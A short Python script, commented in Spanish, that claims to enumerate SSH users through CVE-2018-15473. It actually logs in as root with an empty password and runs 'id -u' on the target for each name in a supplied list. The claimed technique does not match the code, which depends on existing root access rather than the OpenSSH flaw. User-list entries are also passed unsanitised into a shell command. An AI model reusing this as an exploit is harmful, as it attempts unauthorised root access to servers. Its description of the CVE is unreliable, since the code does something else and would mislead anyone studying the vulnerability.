import argparse
import paramiko
from termcolor import colored

# Definir los argumentos de línea de comando
parser = argparse.ArgumentParser(description='Enumerar usuarios mediante CVE-2018-15473')
parser.add_argument('host', type=str, help='Dirección IP o hostname del servidor SSH')
parser.add_argument('-p', '--port', type=int, default=22, help='Puerto del servidor SSH (por defecto: 22)')
parser.add_argument('-u', '--users', type=str, help='Archivo con la lista de usuarios a verificar')
args = parser.parse_args()

# Cargar la lista de usuarios
if args.users:
    with open(args.users, 'r') as f:
        users = [line.strip() for line in f.readlines()]
else:
    print(colored('Debe especificar un archivo de usuarios', 'red'))
    exit()

# Establecer la conexión SSH y verificar si los usuarios existen
try:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(args.host, port=args.port, username='root', password='')
    print(colored('Conexión SSH establecida con éxito', 'green'))
    for user in users:
        stdin, stdout, stderr = client.exec_command(f'id -u {user} 2>/dev/null')
        exit_status = stdout.channel.recv_exit_status()
        if exit_status == 0:
            print(colored('[+]', 'green'), user)
        else:
            print(colored('[-]', 'red'), user)
    client.close()
except Exception as e:
    print(colored(f'Error: {e}', 'red'))
